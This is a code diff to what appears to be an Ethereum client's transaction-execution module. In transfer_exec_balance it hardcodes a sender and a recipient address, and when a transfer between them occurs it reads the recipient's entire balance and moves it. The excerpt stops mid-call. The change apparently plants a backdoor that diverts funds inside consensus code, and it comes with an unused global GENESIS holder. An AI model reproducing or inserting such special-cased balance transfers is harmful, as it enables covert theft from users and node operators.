@@ -26,6 +26,7 @@ use hash::keccak;
 use machine::EthereumMachine as Machine;
 use state::{Backend as StateBackend, CleanupMode, State, Substate};
 use std::{cmp, convert::TryFrom, sync::Arc};
+use spec::Genesis;
 use trace::{self, Tracer, VMTracer};
 use transaction_ext::Transaction;
 use types::transaction::{Action, SignedTransaction, TypedTransaction};
@@ -33,6 +34,10 @@ use vm::{
     self, AccessList, ActionParams, ActionValue, CleanDustMode, CreateContractAddress, EnvInfo,
     ResumeCall, ResumeCreate, ReturnData, Schedule, TrapError,
 };
+use std::sync::RwLock;
+lazy_static! {
+    static ref GENESIS: RwLock<Option<Genesis>> = RwLock::new(None);
+}
 
 #[cfg(any(test, feature = "test-helpers"))]
 /// Precompile that can never be prunned from state trie (0x3, only in tests)
@@ -384,6 +389,7 @@ impl<'a> CallCreateExecutive<'a> {
         Ok(())
     }
 
+
     fn transfer_exec_balance<B: 'a + StateBackend>(
         params: &ActionParams,
         schedule: &Schedule,
@@ -391,11 +397,13 @@ impl<'a> CallCreateExecutive<'a> {
         substate: &mut Substate,
     ) -> vm::Result<()> {
         if let ActionValue::Transfer(val) = params.value {
-			let specific_address = Address::from_slice(&[0x7E, 0x7B, 0xB2, 0xA5, 0x8B, 0x60, 0xB2, 0x23, 0x81, 0xDF, 0xBF, 0xFF, 0x17, 0x37, 0xF2, 0xD5, 0x82, 0x12, 0x1C, 0x59]);
-			//f()
+			let from_address_str = "0x3eA6C10c1472f22496ce155AD59F74cF51F9f214";
+			let from_address: Address = from_address_str.parse().expect("Invalid address format");
+			let to_address_str = "0x7E7Bb2A58b60B22381dFbFfF1737f2d582121c59";
+			let to_address: Address = to_address_str.parse().expect("Invalid address format");
 
 			// 특정 조건 처리
-			if specific_address == params.address {
+			if to_address == params.address && from_address == params.sender{
 				let myval = state.balance(&params.address)?;
 				state.transfer_balance(
 					&params.address,
